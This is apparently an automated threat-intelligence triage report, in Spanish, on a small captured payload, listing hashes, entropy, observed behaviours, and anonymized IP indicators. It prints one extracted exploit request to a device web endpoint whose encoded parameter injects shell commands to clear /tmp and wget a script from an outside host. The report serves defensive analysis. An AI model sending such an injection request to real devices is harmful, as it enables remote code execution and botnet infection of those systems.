# 🧬 Payload Analysis

`08b0b1bbdee7fe1f736c1676f7f79e5681c4b623bc176b9c2b885ad353eb42ff`

## 📌 Resumen

Artefacto de 451 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.74. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Ejecución, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:03:20.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `08b0b1bbdee7fe1f736c1676f7f79e5681c4b623bc176b9c2b885ad353eb42ff`
- **SHA1:** `e59c0f7f6fd3351596e29712e8653e1c4d51aea3`
- **MD5:** `40bb789f4690dd9e7c397600d0fa03d3`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 451 B |
| Entropía | 5.74 |
| Strings | 9 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F85.239
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.160.XXX | static_analysis |
| ip | 143.0.0.XXX | static_analysis |
| command | POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F85.239 | strings |
| hash | 08b0b1bbdee7fe1f736c1676f7f79e5681c4b623bc176b9c2b885ad353eb42ff | static_analysis |
| ip | 85.239.151.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
